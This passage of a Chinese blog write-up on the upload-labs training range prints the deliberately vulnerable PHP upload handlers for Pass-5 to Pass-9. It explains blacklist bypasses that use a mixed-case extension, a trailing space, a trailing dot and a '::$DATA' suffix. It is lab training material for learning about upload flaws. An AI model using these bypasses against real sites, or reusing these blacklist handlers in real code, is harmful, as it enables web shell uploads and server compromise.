punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现与上一关少了统一大小写</p><p>即没有<code>$file_ext = strtolower($file_ext); //转换为小写</code>这一行代码，所以用大小写绕过，上传<strong>phP</strong>之类的文件绕过即可</p><h2 id="Pass-6-空格绕过"><a href="#Pass-6-空格绕过" class="headerlink" title="Pass-6-空格绕过"></a>Pass-6-空格绕过</h2><p>查看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件不允许上传'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现其没有对首尾去除空格，于是我们可以用bp截断，然后再文件明后面添加空格进行绕过<br><img src="/2020/11/16/upload-labs/image-20201118003043021.png" alt="image-20201118003043021" loading="lazy"></p><h2 id="Pass-7-点绕过"><a href="#Pass-7-点绕过" class="headerlink" title="Pass-7-点绕过"></a>Pass-7-点绕过</h2><p>查看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是黑名单没有对后缀名进行去.操作利用Windows特性会自动去掉后缀名中最后的.可在后缀名中加”.”绕过。即可构造**.php.**来绕过上传</p><p><img src="/2020/11/16/upload-labs/image-20201118004432252.png" alt="image-20201118004432252" loading="lazy"></p><h2 id="Pass-8-DATA绕过"><a href="#Pass-8-DATA绕过" class="headerlink" title="Pass-8-::$DATA绕过"></a>Pass-8-::$DATA绕过</h2><p>查看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>黑名单限制，没有去除文件名后缀的<code>::$DATA</code>, 同样可以利用 windows 特性, 在后缀添加<code>::$DATA</code>即可绕过</p><p><img src="/2020/11/16/upload-labs/image-20201118004846869.png" alt="image-20201118004846869" loading="lazy"></p><h2 id="Pass-9-点-空格-点绕过"><a href="#Pass-9-点-空格-点绕过" class="headerlink" title="Pass-9-点+空格+点绕过"></a>Pass-9-点+空格+点绕过</h2><p>查看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token 